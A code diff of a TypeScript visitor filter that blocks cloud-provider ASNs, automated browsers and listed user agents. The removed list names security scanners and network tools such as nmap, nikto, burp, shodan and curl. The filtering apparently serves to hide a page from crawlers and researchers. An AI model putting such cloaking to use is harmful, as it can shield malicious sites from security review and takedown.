@@ -8,7 +8,25 @@ interface GeoJSResponse {
     city: string;
 }
 const BLOCKED_ASN_LIST = [15169, 32934, 396982, 8075, 16509, 14618, 36459, 13335, 14061, 45102, 55967, 54994, 63949, 16276, 24940, 20473, 51167, 174, 3223, 9009, 53667, 51852, 47583, 29802, 40676, 40156, 398324, 398705, 397423, 213373, 398101, 397702, 19318, 14618, 16625, 20940, 35994, 12876, 42831, 58061, 18450];
-const BLOCKED_UA_PATTERNS = ['headless', 'phantom', 'selenium', 'webdriver', 'puppeteer', 'playwright', 'cypress', 'nightmare', 'chrome-lighthouse', 'googlebot', 'bingbot', 'yandex', 'baidu', 'facebook', 'whatsapp', 'telegram', 'discord', 'slack', 'twitter', 'instagram', 'python', 'ruby', 'curl', 'wget', 'postman', 'insomnia', 'http', '.com', 'bot', 'crawler', 'spider', 'scraper', 'axios', 'request', 'fetch', 'node', 'java', 'perl', 'ruby', 'go-http', 'php', 'wordpress', 'zgrab', 'masscan', 'nmap', 'nikto', 'qualys', 'burp', 'semrush', 'ahrefs', 'moz', 'majestic', 'censys', 'shodan', 'cloud', 'aws', 'azure', 'alibaba', 'datadog', 'monitor', 'scan', 'check', 'probe', 'research', 'spider', 'crawl'];
+const BLOCKED_UA_PATTERNS = [
+    'headless',
+    'phantom',
+    'selenium',
+    'webdriver',
+    'puppeteer',
+    'playwright',
+    'cypress',
+    'nightmare',
+    'chrome-lighthouse',
+    'googlebot',
+    'bingbot',
+    'yandex',
+    'baidu',
+    'bot',
+    'crawler',
+    'spider',
+    'scraper',
+];
 const checkBrowserFingerprint = (): boolean => {
     const isAutomated = !!((window as any).webdriver || (window as any)._phantom || (window as any).__nightmare || (window as any).callPhantom || (window as any)._selenium || (window as any).domAutomation || (window as any).domAutomationController);
 
@@ -38,7 +56,8 @@ const checkIP = async (): Promise<boolean> => {
         const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
         const data: GeoJSResponse = await response.json();
 
-        const asnMatch = data.organization?.match(/AS(\d+)/);
+        const asnRegex = /AS(\d+)/;
+        const asnMatch = asnRegex.exec(data.organization ?? '');
         const asn = asnMatch ? parseInt(asnMatch[1]) : null;
 
         if (asn && BLOCKED_ASN_LIST.includes(asn)) {
